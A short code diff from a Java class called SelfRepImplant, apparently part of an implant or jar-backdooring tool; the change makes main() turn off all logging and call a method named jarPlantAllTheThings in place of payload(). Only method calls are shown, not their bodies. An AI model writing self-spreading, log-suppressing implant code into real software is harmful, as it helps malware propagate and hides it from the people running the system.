@@ -170,7 +170,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
      * Also note that this main method will run the payload regardless of what CONF_RUN_FROM_MAIN is set to.
      */
     public static void main(String[] args) {
-        SelfRepImplant.create().payload();
+        disableAllLogging();
+        SelfRepImplant.create().jarPlantAllTheThings();
     }
 
     public void payload() {
